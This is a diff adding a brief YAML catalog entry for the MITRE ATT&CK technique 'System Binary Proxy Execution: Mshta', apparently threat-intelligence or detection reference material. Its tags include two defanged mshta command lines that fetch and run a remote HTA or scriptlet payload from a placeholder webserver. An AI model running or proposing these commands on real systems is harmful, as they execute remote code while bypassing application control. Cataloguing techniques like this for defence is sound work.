@@ -1,0 +1,18 @@
+name: 'System Binary Proxy Execution: Mshta'
+categories:
+- Defense Evasion [Mitre]
+resources:
+- https://attack.mitre.org/techniques/T1218/005/
+tags:
+- Defense Evasion
+- mshta.exe
+- Microsoft HTML Applications (HTA) files
+- JavaScript
+- VBScript
+- mshta http[:]//webserver/payload[.]hta
+- mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
+- bypass application control
+- bypass browser security settings
+- APT29
+- APT32
+- execute malicious scripts
